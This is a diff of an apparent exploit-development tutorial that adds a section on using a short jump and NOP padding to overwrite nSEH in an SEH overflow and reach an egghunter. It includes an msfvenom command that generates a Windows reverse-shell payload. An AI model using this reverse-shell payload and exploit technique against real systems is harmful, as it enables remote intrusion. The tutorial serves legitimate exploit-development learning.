@@ -891,6 +891,19 @@ Let's now generate some shell code, make some last adjustments to the overall ex
 
 
 
+### [](#header-3) Jumping to Egghunter
+
+
+
+Now just to reiterate what are aiming to do here is over run **SEH**, perform a `POP POP RET` sequence which in turns pushes the value of **nSEH** into the **EIP Register** - In this case we would like to either place the address of our Egghunter over **nSEH** or some form of instructions that will jump us down into our Egghunter shellcode, once again if we check out the stack we can see we don't have far too travel.
+
+
+
+
+
+
+
+
 
 ### [](#header-3) Generating Shellcode & Final Exploit
 
@@ -906,15 +919,52 @@ m0chan@kali:/> msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=4
 
 
 
+
+
 Great shell code is now generated we simply just pop this into our final exploit.
 
 
+<p align = "center">
+<img src = "https://i.imgur.com/tRgUMxp.png">
+</p>
 
 
 
 
 
+In this case you can see we will jump from memory address ***0237FFC4*** down to ***0237FFCC*** which will be where our Egghunter will sit. 
 
+
+
+Now here we would just overwrite the address of **nSEH** with ***0237FFCC*** but like I said it's not very practical, and it is better practice to just do a simple short jump aka opcode `EB` - However there is a small twist. the `EB` instruction is only **2 Bytes** and **nSEH** expects **4 Bytes.**
+
+
+
+This isn't a huge problem as we can simple just use `NOPS` aka `\x90` so what we will do here is fill **nSEH** with `\x90\x90` which means **2/4 bytes** are full followed by our `EB` instruction `\xeb\x06` which stands for jump 6 bytes.  Now **4/4 bytes** are filled within **nSEH** 
+
+
+
+Our exploit will now technically jump **8 Bytes** but we only need to jump **6 Bytes** as we are *really* just *sliding* down the **NOPS** so 6 bytes is all that's required.
+
+
+
+Great so now update our **nSEH** variable in our exploit to reflect the below
+
+
+
+```python
+nseh = "\xeb\x06\x90\x90"
+```
+
+
+
+Of course **little endian** is the reason once again for the reverse order. 
+
+
+
+
+
+**Final Exploit**
 
 
 
